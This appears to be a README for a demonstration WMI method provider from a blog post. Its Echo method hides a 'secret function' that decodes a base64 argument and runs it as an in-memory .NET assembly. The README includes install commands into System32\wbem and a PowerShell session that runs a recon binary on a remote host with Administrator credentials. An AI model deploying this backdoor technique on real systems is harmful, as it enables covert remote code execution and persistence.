# Scrkipt Kiddie WMI Provider

This repo contains the source code necessary to build the Script Kiddie WMI Provider example from the blog, "WMI Providers for Script Kiddies". Please see the blog for a description of the WMI provider.

# Capabilities

The Script Kiddie provider demonstrates how to implement a WMI method provider. It implements/exposes one method: Echo. This method has a begnin function and a secret function.

## Begnin Function

The Echo method simply returns the input argument prepended with the string "Echo: ".

## Secret Function

If the input argument begins with '!', then the method will:

1. Decoded the input argument
2. Load the decoded .NET assembly into memory
3. Execute the .NET assembly from memory
4. Return the .NET assembly output

# Build

1. Open the solution with Visual Studio
2. Build the release version
3. Binaries are generated in bin/Release/ subdirectory

# Install

1. Copy the binaries to target (preferrably C:\Windows\System32\wbem\)
2. Install the .NET assembly using Microsoft .NET Install Utility
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe C:\Windows\System32\wbem\Win32_Echo.dll
```
NOTE: On x86 systems the Install Utility directory is under C:\Windows\Microsoft.NET\Framework

# Use

## Begnin Function
```
PS C:\tmp> Invoke-WMIMethod -Namespace ROOT\test -Class Win32_Echo -Name Echo -ArgumentList "Hello World!"


__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 1
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ReturnValue      : Echo: Hello World!
PSComputerName   :
```

## Secret Function
```
PS C:\tmp> .\recon.exe

recon
=============================
userName:  WIN10-X64-DEV\todda1
dnsName:   Win10-x64-Dev
ipAddress: 192.168.0.134

PS C:\tmp> $exeContent = Get-Content C:\tmp\recon.exe -Encoding byte

PS C:\tmp> $encodedContent = [System.Convert]::ToBase64String($exeContent)

PS C:\tmp> Invoke-WMIMethod -Credential 192.168.0.104\Administrator -ComputerName 192.168.0.104 -Namespace "ROOT\test" -Class "Win32_Echo" -Name "Echo" -ArgumentList "!$encodedContent"


__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 1
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ReturnValue      :
                   recon
                   =============================
                   userName:  WIN10-X86\Administrator
                   dnsName:   win10-x86
                   ipAddress: 192.168.0.104

PSComputerName   :
```